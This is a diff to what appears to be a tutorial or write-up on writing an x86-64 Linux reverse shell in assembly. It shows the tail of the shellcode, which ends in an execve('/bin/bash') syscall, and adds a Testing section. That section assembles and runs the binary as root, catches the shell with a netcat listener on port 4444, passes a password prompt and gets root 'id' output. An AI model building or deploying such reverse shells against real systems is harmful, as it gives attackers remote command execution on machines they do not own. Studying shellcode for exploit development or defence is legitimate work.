@@ -160,7 +160,7 @@ egrep "(connect|execve |write |read |socket |dup2)"
 
 
 # Assembly
-```bash
+```asm
 global _start
 
 section .text
@@ -291,4 +291,25 @@ xor rdx, rdx
 mov rdi, rsp
 mov al, 0x3b  
 syscall  ; call execve("/bin/bash", NULL, NULL)
+```
+
+## Testing
+#### Terminal 1
+```bash
+root# nasm -f elf64 revshell.asm -o revshell.o
+root# ld revshell.o -o revshell
+root# ./revshell
+```
+
+## Testing
+#### Terminal 2
+```bash
+root@zed# nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [127.1.1.1] from (UNKNOWN) [127.0.0.1] 44400
+Mothers Maiden Name?asd
+Mothers Maiden Name?123
+Mothers Maiden Name?1337
+id
+uid=0(root) gid=0(root) groups=0(root),46(plugdev)
 ```
